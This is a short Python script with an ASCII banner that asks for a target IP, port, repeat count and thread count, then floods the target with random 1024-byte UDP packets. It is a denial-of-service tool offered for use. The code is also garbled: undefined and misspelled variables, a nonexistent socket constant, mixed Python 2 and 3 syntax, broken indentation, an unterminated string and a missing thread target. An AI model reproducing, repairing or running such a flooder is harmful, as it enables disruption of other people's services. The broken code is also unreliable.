import socket
import random
import threading
import os,sys

print("  _   ___   ____  ______  
 | | | \ \ / /\ \/ /  _ \ 
 | |_| |\ V /  \  /| | | |
 |  _  | | |   /  \| |_| |
 |_| |_| |_|  /_/\_\____/ 
                          ")

IP = str(input("IP : "))
PORT = int(input("PORT : "))
Times = int(input("Times : "))
threads_wibu = int(input("Threads : "))
os.system("clear")

def run():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
            s.connect((ip,port))
            s.sendto(data,aadr)
            for x in range(times):
                s.sendto(data,addr)
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
        except:
            print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
for y in range(threads_wibu):
    th = threading.Thread(target=server)
    th.start()